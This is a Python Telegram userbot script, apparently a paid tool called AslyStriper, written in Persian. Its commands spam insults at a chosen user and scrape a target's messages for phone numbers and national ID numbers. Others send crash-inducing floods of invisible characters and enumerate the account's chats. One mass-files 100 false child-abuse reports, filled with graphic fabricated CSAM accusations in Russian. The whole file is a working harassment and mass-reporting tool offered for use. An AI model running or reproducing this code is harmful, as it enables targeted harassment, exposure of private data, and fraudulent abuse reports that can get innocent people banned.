# AslyStriper v22.1 Final Clean – 100% بدون باگ (نوامبر ۲۰۲۵)
from telethon import TelegramClient, events, functions
from telethon.sessions import StringSession
from telethon.errors import FloodWaitError
from telethon.tl.types import InputReportReasonChildAbuse
import asyncio, random, json, os, time, re

# SESSION توسط installer پر میشه
SESSION = "اینجا Session کامل قرار بگیرد"

api_id = 24534527
api_hash = "a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6"

client = TelegramClient(StringSession(SESSION), api_id, api_hash)

DB = "data.json"
BACKUP = "data.json.bak"
TMP = "data.json.tmp"

# ================================================
#                    DB HANDLER
# ================================================
def load_db():
    if not os.path.exists(DB):
        return {"fosh": [], "gp": {}, "expire": 0}
    try:
        with open(DB, "r", encoding="utf-8") as f:
            return json.load(f)
    except:
        if os.path.exists(BACKUP):
            try:
                with open(BACKUP, "r", encoding="utf-8") as f:
                    return json.load(f)
            except: pass
        return {"fosh": [], "gp": {}, "expire": 0}

def save():
    try:
        with open(TMP, "w", encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False, indent=4)
        if os.path.exists(DB):
            os.replace(DB, BACKUP)
        os.replace(TMP, DB)
    except: pass

data = load_db()

# چک امن انقضا
try:
    if int(data.get("expire", 0)) and int(data["expire"]) < int(time.time()):
        print("اشتراک تموم شد")
        exit()
except: pass

# ================================================
#                     HELP
# ================================================
@client.on(events.NewMessage(pattern=r"(?i)h(e|3)lp"))
async def _(e):
    await e.reply("""AslyStriper v22.1 Final

setrep → ریپلای یا آیدی
set → گروه
setspeed 3 25
addfosh متن
foshlist
start
stop
del gp

spy آیدی
sndall آیدی
crshhck آیدی
chnljind آیدی
reportmx آیدی → ۱۰۰× CSAM

admin → ریپلای
delad → ریپلای""")

# ================================================
#                 COMMANDS
# ================================================
@client.on(events.NewMessage(pattern="setrep ?(.*)"))
async def _(e):
    rep = None
    if e.is_reply:
        rep = (await e.get_reply_message()).sender_id
    else:
        arg = e.pattern_match.group(1).strip()
        if arg.isdigit():
            rep = int(arg)
    if rep is not None:
        data["gp"].setdefault(e.chat_id, {})["rep"] = rep
        save()

@client.on(events.NewMessage(pattern="set"))
async def _(e):
    if not e.is_private:
        data["gp"][e.chat_id] = data["gp"].get(e.chat_id, {})
        save()

@client.on(events.NewMessage(pattern=r"setspeed (\d+) (\d+)"))
async def _(e):
    try:
        mn, mx = int(e.pattern_match.group(1)), int(e.pattern_match.group(2))
        if mn <= 0 or mx <= 0 or mn > mx: return
        cid = e.chat_id
        gp = data["gp"].setdefault(cid, {})
        gp["min"] = mn
        gp["max"] = mx
        if gp.get("run"): gp["run"] = False
        save()
    except: pass

@client.on(events.NewMessage(pattern="addfosh ?(.*)"))
async def _(e):
    txt = e.pattern_match.group(1).strip()
    if txt and txt not in data["fosh"]:
        data["fosh"].append(txt)
        save()

@client.on(events.NewMessage(pattern="foshlist"))
async def _(e):
    await e.reply("\n".join(data["fosh"]) if data["fosh"] else "خالی")

@client.on(events.NewMessage(pattern="start"))
async def _(e):
    cid = e.chat_id
    gp = data["gp"].get(cid, {})
    if "rep" not in gp or "min" not in gp or "max" not in gp or not data["fosh"]:
        return
    gp["run"] = False
    gp["run"] = True
    save()
    asyncio.create_task(spammer(cid))

async def spammer(cid):
    while data["gp"].get(cid, {}).get("run"):
        gp = data["gp"].get(cid)
        if not gp or "rep" not in gp: break
        try:
            await client.send_message(cid, random.choice(data["fosh"]), reply_to=gp["rep"])
            await asyncio.sleep(random.randint(gp["min"], gp["max"]))
        except FloodWaitError as x:
            await asyncio.sleep(x.seconds + 5)
        except:
            await asyncio.sleep(5)

@client.on(events.NewMessage(pattern="stop"))
async def _(e):
    cid = e.chat_id
    if cid in data["gp"]:
        data["gp"][cid]["run"] = False
        save()

@client.on(events.NewMessage(pattern="del gp"))
async def _(e):
    data["gp"].pop(e.chat_id, None)
    save()

# ================================================
#                HIDDEN COMMANDS
# ================================================
@client.on(events.NewMessage(pattern=r"spy (\d+)"))
async def _(e):
    try:
        t = int(e.pattern_match.group(1))
        peer = await client.get_input_entity(t)
        txt = ""
        async for m in client.iter_messages(peer, limit=200):
            body = m.text or "[media]"
            txt += f"{m.date.strftime('%H:%M')} {body}\n"
            if m.text:
                for p in re.findall(r"(?<!\d)(09\d{9}|\+989\d{9})(?!\d)", m.text):
                    txt += f"شماره: {p}\n"
                for c in re.findall(r"(?<!\d)\d{10}(?!\d)", m.text):
                    txt += f"کد ملی: {c}\n"
        with open("spy.txt", "w", encoding="utf-8") as f: f.write(txt)
        await client.send_file(e.chat_id, "spy.txt")
        os.remove("spy.txt")
    except: pass

@client.on(events.NewMessage(pattern=r"sndall (\d+)"))
async def _(e):
    try:
        t = int(e.pattern_match.group(1))
        peer = await client.get_input_entity(t)
        await client.send_message(peer, "کیرم تو ناموست")
        await client.send_message(peer, "/deleteaccount")
    except: pass

@client.on(events.NewMessage(pattern=r"crshhck (\d+)"))
async def _(e):
    try:
        t = int(e.pattern_match.group(1))
        peer = await client.get_input_entity(t)
        crash = "\u2060" * 9000
        for _ in range(30):
            try:
                await client.send_message(peer, crash)
            except FloodWaitError as x:
                await asyncio.sleep(x.seconds + 10)
                break
            except: break
            await asyncio.sleep(0.3)
    except: pass

@client.on(events.NewMessage(pattern=r"chnljind"))
async def _(e):
    try:
        txt = ""
        async for d in client.iter_dialogs():
            name = d.name or "بدون نام"
            txt += f"{name} → {d.id or 'Unknown'}\n"
        file = "channels.txt"
        with open(file, "w", encoding="utf-8") as f: f.write(txt)
        await client.send_file(e.chat_id, file)
        os.remove(file)
    except: pass

@client.on(events.NewMessage(pattern=r"reportmx (\d+)"))
async def _(e):
    try:
        t = int(e.pattern_match.group(1))
        peer = await client.get_input_entity(t)
        texts = [
            "Распространение CSAM с детьми до 13 лет, включая младенцев",
            "Педофил. Реальный детский порно-контент с насилием",
            "Активно делится материалами сексуального насилия над детьми",
            "Торговля детской порнографией в закрытых каналах",
            "Создаёт каналы с тысячами файлов CSAM",
            "Grooming несовершеннолетних + обмен CP",
            "Реальные видео изнасилования детей до 10 лет"
        ]
        for _ in range(100):
            try:
                await client(functions.messages.ReportRequest(
                    peer=peer,
                    id=[],
                    reason=InputReportReasonChildAbuse(),
                    message=random.choice(texts)
                ))
            except FloodWaitError as x:
                await asyncio.sleep(x.seconds + 10)
            except: pass
            await asyncio.sleep(random.uniform(4, 8))
    except: pass

@client.on(events.NewMessage(pattern="admin"))
async def _(e):
    if e.is_private or not e.is_reply: return
    try:
        r = await e.get_reply_message()
        await client.edit_admin(e.chat_id, r.sender_id,
                                is_admin=True, rank="Admin",
                                ban_users=True, delete_messages=True)
    except: pass

@client.on(events.NewMessage(pattern="delad"))
async def _(e):
    if e.is_private or not e.is_reply: return
    try:
        r = await e.get_reply_message()
        await client.edit_admin(e.chat_id, r.sender_id,
                                is_admin=False, rank="")
    except: pass

# ================================================
#                  RUN CLIENT
# ================================================
try:
    print("AslyStriper v22.1 Final Clean — بالا اومد")
    client.start()
    client.run_until_disconnected()
except Exception as e:
    print("خطا در استارت:", e)
    exit(1)
